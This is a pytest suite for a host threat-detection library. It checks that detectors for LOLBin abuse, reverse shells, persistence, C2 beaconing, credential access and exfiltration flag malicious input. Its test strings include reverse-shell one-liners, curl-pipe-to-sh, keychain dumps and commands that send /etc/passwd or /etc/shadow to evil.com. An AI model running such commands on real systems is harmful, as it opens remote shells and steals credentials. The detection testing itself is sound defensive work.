"""Tests for AMOSKYS Advanced Threat Detection Primitives.

Covers:
    - AttackPhase enum completeness
    - ThreatIndicator construction and serialization
    - SuspiciousPathDetector (path classification, random name detection)
    - LOLBinDetector (LOLBin abuse patterns)
    - ReverseShellDetector (shell pattern matching, process context)
    - PersistenceDetector (file write to persistence paths)
    - C2Detector (port-based, beaconing)
    - CredentialAccessDetector (file access, command checks)
    - ExfiltrationDetector (command and volume checks)
    - ThreatAnalyzer (orchestration, summary, thread safety)
"""

from datetime import datetime, timedelta

import pytest

from amoskys.agents.common.threat_detection import (
    AttackPhase,
    C2Detector,
    CredentialAccessDetector,
    ExfiltrationDetector,
    LOLBinDetector,
    NetworkContext,
    PersistenceDetector,
    ProcessContext,
    ReverseShellDetector,
    SuspiciousPathDetector,
    ThreatAnalyzer,
    ThreatIndicator,
)

# ---------------------------------------------------------------------------
# AttackPhase
# ---------------------------------------------------------------------------


class TestAttackPhase:
    def test_has_13_phases(self):
        assert len(AttackPhase) == 13

    def test_all_phases_have_string_values(self):
        for phase in AttackPhase:
            assert isinstance(phase.value, str)
            assert len(phase.value) > 0

    def test_key_phases_exist(self):
        phases = {p.name for p in AttackPhase}
        for expected in [
            "RECONNAISSANCE",
            "EXECUTION",
            "PERSISTENCE",
            "PRIVILEGE_ESCALATION",
            "EXFILTRATION",
            "COMMAND_AND_CONTROL",
        ]:
            assert expected in phases


# ---------------------------------------------------------------------------
# ThreatIndicator
# ---------------------------------------------------------------------------


class TestThreatIndicator:
    def _make(self, **overrides):
        defaults = dict(
            indicator_type="test",
            value="test_value",
            confidence=0.9,
            attack_phase=AttackPhase.EXECUTION,
            mitre_techniques=["T1059"],
            description="Test threat",
            source="test_source",
        )
        defaults.update(overrides)
        return ThreatIndicator(**defaults)

    def test_basic_creation(self):
        ind = self._make()
        assert ind.indicator_type == "test"
        assert ind.confidence == 0.9

    def test_to_dict_has_expected_keys(self):
        d = self._make().to_dict()
        for key in [
            "type",
            "value",
            "confidence",
            "phase",
            "mitre",
            "description",
            "source",
            "timestamp",
        ]:
            assert key in d

    def test_to_dict_phase_is_string(self):
        d = self._make().to_dict()
        assert d["phase"] == "execution"

    def test_to_dict_timestamp_is_iso(self):
        d = self._make().to_dict()
        # Should parse as ISO
        datetime.fromisoformat(d["timestamp"])


# ---------------------------------------------------------------------------
# SuspiciousPathDetector
# ---------------------------------------------------------------------------


class TestSuspiciousPathDetector:
    def test_trusted_path_not_suspicious(self):
        is_sus, _ = SuspiciousPathDetector.is_suspicious_path("/usr/bin/ls")
        assert is_sus is False

    def test_trusted_sbin_not_suspicious(self):
        is_sus, _ = SuspiciousPathDetector.is_suspicious_path("/sbin/ifconfig")
        assert is_sus is False

    def test_tmp_is_suspicious(self):
        is_sus, reason = SuspiciousPathDetector.is_suspicious_path("/tmp/evil")
        assert is_sus is True
        assert "suspicious location" in reason.lower() or "/tmp/" in reason

    def test_var_tmp_is_suspicious(self):
        is_sus, _ = SuspiciousPathDetector.is_suspicious_path("/var/tmp/payload")
        assert is_sus is True

    def test_dev_shm_is_suspicious(self):
        is_sus, _ = SuspiciousPathDetector.is_suspicious_path("/dev/shm/dropper")
        assert is_sus is True

    def test_hidden_directory_is_suspicious(self):
        is_sus, reason = SuspiciousPathDetector.is_suspicious_path(
            "/home/user/.hidden/malware"
        )
        assert is_sus is True
        assert "hidden" in reason.lower()

    def test_suspicious_extension_sh(self):
        is_sus, reason = SuspiciousPathDetector.is_suspicious_path(
            "/home/user/payload.sh"
        )
        assert is_sus is True
        assert ".sh" in reason

    def test_suspicious_extension_jar(self):
        is_sus, reason = SuspiciousPathDetector.is_suspicious_path(
            "/home/user/exploit.jar"
        )
        assert is_sus is True

    def test_random_hex_name_detected(self):
        assert SuspiciousPathDetector._looks_random("a1b2c3d4e5f6a7b8") is True

    def test_normal_name_not_random(self):
        assert SuspiciousPathDetector._looks_random("firefox") is False

    def test_short_name_not_random(self):
        assert SuspiciousPathDetector._looks_random("abc") is False


# ---------------------------------------------------------------------------
# LOLBinDetector
# ---------------------------------------------------------------------------


class TestLOLBinDetector:
    def test_osascript_shell_script(self):
        result = LOLBinDetector.check_command(
            "osascript", "osascript -e 'do shell script \"curl http://evil.com\"'"
        )
        assert result is not None
        assert result.indicator_type == "lolbin_abuse"
        assert "T1059.002" in result.mitre_techniques

    def test_curl_pipe_to_bash(self):
        result = LOLBinDetector.check_command(
            "curl", "curl http://evil.com/payload | sh"
        )
        assert result is not None

    def test_bash_reverse_shell(self):
        result = LOLBinDetector.check_command(
            "bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        )
        assert result is not None

    def test_python_socket_import(self):
        result = LOLBinDetector.check_command(
            "python", "python -c 'import socket; import subprocess'"
        )
        assert result is not None

    def test_nc_reverse_shell(self):
        result = LOLBinDetector.check_command("nc", "nc -e /bin/sh 10.0.0.1 4444")
        assert result is not None

    def test_safe_curl_not_flagged(self):
        result = LOLBinDetector.check_command(
            "curl", "curl https://api.github.com/repos"
        )
        assert result is None

    def test_safe_bash_not_flagged(self):
        result = LOLBinDetector.check_command("bash", "bash ./build.sh")
        assert result is None

    def test_unknown_binary_not_flagged(self):
        result = LOLBinDetector.check_command("myapp", "myapp --start")
        assert result is None


# ---------------------------------------------------------------------------
# ReverseShellDetector
# ---------------------------------------------------------------------------


class TestReverseShellDetector:
    def test_bash_dev_tcp(self):
        result = ReverseShellDetector.check_cmdline(
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        )
        assert result is not None
        assert result.indicator_type == "reverse_shell"
        assert result.confidence >= 0.9

    def test_python_reverse_shell(self):
        result = ReverseShellDetector.check_cmdline(
            "python -c 'import socket; import subprocess; s=socket.socket(); s.connect((\"10.0.0.1\",4444))'"
        )
        assert result is not None

    def test_nc_reverse_shell(self):
        result = ReverseShellDetector.check_cmdline("nc -e /bin/bash 10.0.0.1 4444")
        assert result is not None

    def test_mkfifo_nc_shell(self):
        result = ReverseShellDetector.check_cmdline(
            "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 1234 > /tmp/f"
        )
        assert result is not None

    def test_normal_command_not_flagged(self):
        result = ReverseShellDetector.check_cmdline("ls -la /tmp")
        assert result is None

    def test_process_context_shell_with_network(self):
        ctx = ProcessContext(
            pid=1234,
            name="bash",
            cmdline="bash",
            exe_path="/bin/bash",
            username="user",
            parent_pid=1,
            parent_name="init",
            parent_cmdline="init",
            timestamp=datetime.now(),
            network_connections=[{"remote_ip": "10.0.0.1", "remote_port": 4444}],
        )
        result = ReverseShellDetector.check_process_context(ctx)
        assert result is not None
        assert result.indicator_type == "suspicious_shell_network"

    def test_process_context_shell_on_port_22_not_flagged(self):
        ctx = ProcessContext(
            pid=1234,
            name="bash",
            cmdline="bash",
            exe_path="/bin/bash",
            username="user",
            parent_pid=1,
            parent_name="sshd",
            parent_cmdline="sshd",
            timestamp=datetime.now(),
            network_connections=[{"remote_ip": "10.0.0.1", "remote_port": 22}],
        )
        result = ReverseShellDetector.check_process_context(ctx)
        assert result is None


# ---------------------------------------------------------------------------
# PersistenceDetector
# ---------------------------------------------------------------------------


class TestPersistenceDetector:
    def test_launch_agent_write(self):
        result = PersistenceDetector.check_file_write(
            "/Library/LaunchAgents/com.evil.plist"
        )
        assert result is not None
        assert result.attack_phase == AttackPhase.PERSISTENCE
        assert "T1543.001" in result.mitre_techniques

    def test_launch_daemon_write(self):
        result = PersistenceDetector.check_file_write(
            "/Library/LaunchDaemons/com.evil.plist"
        )
        assert result is not None

    def test_cron_tab_write(self):
        result = PersistenceDetector.check_file_write("/var/at/tabs/root")
        assert result is not None

    def test_bashrc_write(self):
        result = PersistenceDetector.check_file_write(
            "/Users/testuser/.bashrc", content=None
        )
        # ~/.bashrc → shell_profile, but expanduser may change path
        # Test the expanded form
        import os

        result2 = PersistenceDetector.check_file_write(os.path.expanduser("~/.bashrc"))
        assert result2 is not None

    def test_normal_file_write_not_flagged(self):
        result = PersistenceDetector.check_file_write("/Users/testuser/myfile.txt")
        assert result is None

    def test_suspicious_plist_content_increases_confidence(self):
        content = b"<plist><key>RunAtLoad</key><true/></plist>"
        result = PersistenceDetector.check_file_write(
            "/Library/LaunchAgents/com.evil.plist", content=content
        )
        assert result is not None
        assert result.confidence >= 0.90


# ---------------------------------------------------------------------------
# C2Detector
# ---------------------------------------------------------------------------


class TestC2Detector:
    def _conn(self, **overrides):
        defaults = dict(
            src_ip="192.168.1.100",
            src_port=54321,
            dst_ip="8.8.8.8",
            dst_port=443,
            protocol="TCP",
            bytes_in=1000,
            bytes_out=500,
            direction="outbound",
        )
        defaults.update(overrides)
        return NetworkContext(**defaults)

    def test_known_c2_port(self):
        conn = self._conn(dst_port=4444)
        result = C2Detector.check_connection(conn)
        # Port alone gives 0.3 + unusual outbound 0.2 = 0.5 → just meets threshold
        assert result is not None
        assert result.attack_phase == AttackPhase.COMMAND_AND_CONTROL

    def test_high_outbound_ratio_on_c2_port(self):
        conn = self._conn(dst_port=4444, bytes_out=50000, bytes_in=100)
        result = C2Detector.check_connection(conn)
        assert result is not None
        assert result.confidence > 0.5

    def test_normal_https_not_flagged(self):
        conn = self._conn(dst_port=443, bytes_out=500, bytes_in=5000)
        result = C2Detector.check_connection(conn)
        assert result is None

    def test_beaconing_detection(self):
        now = datetime.now()
        connections = [self._conn(dst_ip="10.0.0.1", dst_port=4444) for _ in range(10)]
        # Create regular 60s intervals
        for i, conn in enumerate(connections):
            conn.timestamp = now + timedelta(seconds=60 * i)

        result = C2Detector.detect_beaconing(connections, "10.0.0.1:4444")
        assert result is not None
        assert result.indicator_type == "beaconing"
        assert "60s" in result.description

    def test_irregular_timing_not_beaconing(self):
        now = datetime.now()
        intervals = [1, 300, 5, 1200, 2]  # Very irregular
        connections = []
        t = now
        for gap in intervals:
            conn = self._conn(dst_ip="10.0.0.1", dst_port=4444)
            conn.timestamp = t
            connections.append(conn)
            t += timedelta(seconds=gap)

        result = C2Detector.detect_beaconing(connections, "10.0.0.1:4444")
        assert result is None

    def test_too_few_samples_not_beaconing(self):
        now = datetime.now()
        connections = [self._conn() for _ in range(2)]
        for i, conn in enumerate(connections):
            conn.timestamp = now + timedelta(seconds=60 * i)
        result = C2Detector.detect_beaconing(connections, "8.8.8.8:443")
        assert result is None


# ---------------------------------------------------------------------------
# CredentialAccessDetector
# ---------------------------------------------------------------------------


class TestCredentialAccessDetector:
    def test_ssh_key_read(self):
        import os

        path = os.path.expanduser("~/.ssh/id_rsa")
        result = CredentialAccessDetector.check_file_access(path, "read")
        assert result is not None
        assert "T1552.004" in result.mitre_techniques

    def test_aws_creds_read(self):
        import os

        path = os.path.expanduser("~/.aws/credentials")
        result = CredentialAccessDetector.check_file_access(path, "read")
        assert result is not None

    def test_normal_file_not_flagged(self):
        result = CredentialAccessDetector.check_file_access("/tmp/myfile.txt", "read")
        assert result is None

    def test_keychain_dump_command(self):
        result = CredentialAccessDetector.check_command("security dump-keychain -d")
        assert result is not None
        assert result.attack_phase == AttackPhase.CREDENTIAL_ACCESS

    def test_cat_id_rsa(self):
        result = CredentialAccessDetector.check_command("cat ~/.ssh/id_rsa")
        assert result is not None

    def test_normal_command_not_flagged(self):
        result = CredentialAccessDetector.check_command("ls -la /home")
        assert result is None


# ---------------------------------------------------------------------------
# ExfiltrationDetector
# ---------------------------------------------------------------------------


class TestExfiltrationDetector:
    def test_tar_sensitive_directory(self):
        result = ExfiltrationDetector.check_command(
            "tar czf /tmp/backup.tar.gz ~/Documents"
        )
        assert result is not None
        assert result.attack_phase == AttackPhase.COLLECTION

    def test_zip_ssh_keys(self):
        result = ExfiltrationDetector.check_command("zip keys.zip ~/.ssh")
        assert result is not None

    def test_curl_post_file(self):
        result = ExfiltrationDetector.check_command(
            "curl -d @/etc/passwd https://evil.com/upload"
        )
        assert result is not None
        assert result.attack_phase == AttackPhase.EXFILTRATION

    def test_scp_to_remote(self):
        result = ExfiltrationDetector.check_command(
            "scp /etc/shadow attacker@evil.com:/tmp/"
        )
        assert result is not None

    def test_normal_tar_not_flagged(self):
        result = ExfiltrationDetector.check_command("tar czf backup.tar.gz ./src")
        assert result is None

    def test_large_volume_detection(self):
        now = datetime.now()
        connections = []
        for _ in range(5):
            conn = NetworkContext(
                src_ip="192.168.1.100",
                src_port=54321,
                dst_ip="10.0.0.1",
                dst_port=443,
                protocol="TCP",
                bytes_in=1000,
                bytes_out=30 * 1024 * 1024,  # 30MB each = 150MB total
                direction="outbound",
                timestamp=now,
            )
            connections.append(conn)

        result = ExfiltrationDetector.check_network_volume(connections)
        assert result is not None
        assert result.attack_phase == AttackPhase.EXFILTRATION

    def test_normal_volume_not_flagged(self):
        now = datetime.now()
        conn = NetworkContext(
            src_ip="192.168.1.100",
            src_port=54321,
            dst_ip="8.8.8.8",
            dst_port=443,
            protocol="TCP",
            bytes_in=5000,
            bytes_out=1000,
            direction="outbound",
            timestamp=now,
        )
        result = ExfiltrationDetector.check_network_volume([conn])
        assert result is None


# ---------------------------------------------------------------------------
# ThreatAnalyzer (integration)
# ---------------------------------------------------------------------------


class TestThreatAnalyzer:
    def test_analyze_process_suspicious_path(self):
        analyzer = ThreatAnalyzer()
        ctx = ProcessContext(
            pid=1234,
            name="dropper",
            cmdline="/tmp/dropper --payload",
            exe_path="/tmp/dropper",
            username="user",
            parent_pid=1,
            parent_name="bash",
            parent_cmdline="bash",
            timestamp=datetime.now(),
        )
        indicators = analyzer.analyze_process(ctx)
        assert len(indicators) > 0
        assert any(i.indicator_type == "suspicious_path" for i in indicators)

    def test_analyze_network_c2_port(self):
        analyzer = ThreatAnalyzer()
        conn = NetworkContext(
            src_ip="192.168.1.100",
            src_port=54321,
            dst_ip="10.0.0.1",
            dst_port=4444,
            protocol="TCP",
            bytes_in=100,
            bytes_out=50000,
            direction="outbound",
        )
        indicators = analyzer.analyze_network(conn)
        assert len(indicators) > 0

    def test_analyze_file_persistence(self):
        analyzer = ThreatAnalyzer()
        indicators = analyzer.analyze_file_operation(
            "/Library/LaunchAgents/com.evil.plist", "write"
        )
        assert len(indicators) > 0

    def test_analyze_file_credential_access(self):
        analyzer = ThreatAnalyzer()
        import os

        path = os.path.expanduser("~/.ssh/id_rsa")
        indicators = analyzer.analyze_file_operation(path, "read")
        assert len(indicators) > 0

    def test_threat_summary_structure(self):
        analyzer = ThreatAnalyzer()
        summary = analyzer.get_threat_summary()
        assert summary["threat_level"] == "NONE"
        assert summary["total_indicators"] == 0

    def test_threat_summary_escalates(self):
        analyzer = ThreatAnalyzer()
        # Add many high-confidence indicators
        for _ in range(6):
            analyzer.indicators.append(
                ThreatIndicator(
                    indicator_type="test",
                    value="x",
                    confidence=0.95,
                    attack_phase=AttackPhase.EXECUTION,
                    mitre_techniques=["T1059"],
                    description="test",
                    source="test",
                )
            )
        summary = analyzer.get_threat_summary()
        assert summary["threat_level"] == "CRITICAL"
        assert summary["high_confidence_count"] == 6

    def test_clear_indicators(self):
        analyzer = ThreatAnalyzer()
        analyzer.indicators.append(
            ThreatIndicator(
                indicator_type="test",
                value="x",
                confidence=0.5,
                attack_phase=AttackPhase.EXECUTION,
                mitre_techniques=[],
                description="test",
                source="test",
            )
        )
        assert len(analyzer.indicators) == 1
        analyzer.clear_indicators()
        assert len(analyzer.indicators) == 0
